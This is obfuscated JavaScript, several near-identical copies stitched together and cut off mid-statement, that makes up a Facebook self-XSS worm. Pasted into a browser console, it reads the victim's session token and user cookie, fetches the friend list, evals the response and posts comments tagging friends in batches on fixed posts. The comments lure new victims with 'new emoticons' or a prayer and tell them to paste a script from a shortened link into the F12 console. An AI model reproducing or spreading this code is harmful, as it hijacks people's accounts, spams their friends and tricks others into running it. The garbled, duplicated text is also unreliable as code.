_0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","224761497713861","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","278044245696309","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","456836191114599","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","402422216568254","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Encontre o Carangueijo :D :D :D :D :D :D :D :D :D Achou o Carangueijo? :D :D :D :D :D :D :D :D Marque e Comente.. :D :D :D :D :D :D :D :D  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","406524929491316","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Oração para Meus Amigos ^_^ Curta, Compartilhe, Comente ou Marque Todos.. Use Google Chrome, aperte F12 e na guia console cole o script do link http://goo.gl/yTsTJ5 e de enter  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
// JavaScript Document
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","455577634573788","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var 